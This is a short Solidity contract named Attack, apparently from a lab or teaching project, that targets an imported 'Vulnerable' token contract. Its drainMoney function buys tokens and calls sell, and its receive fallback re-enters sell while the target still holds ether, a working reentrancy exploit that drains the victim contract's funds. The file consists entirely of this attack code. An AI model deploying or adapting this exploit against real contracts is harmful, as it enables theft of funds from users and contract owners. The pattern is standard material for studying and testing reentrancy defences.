// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {Vulnerable} from "contracts/Vulnerable.sol";

contract Attack {
    Vulnerable public erc20;

    constructor(address _token) {
        erc20 = Vulnerable(_token);
    }

    receive() external payable {
        if (address(erc20).balance > 0) {
            erc20.sell();
        }
    }

    function drainMoney() external payable {
        require(msg.value >= 1 ether, "Not enough ether");
        erc20.buy{value: msg.value}();
        erc20.sell();
    }
}
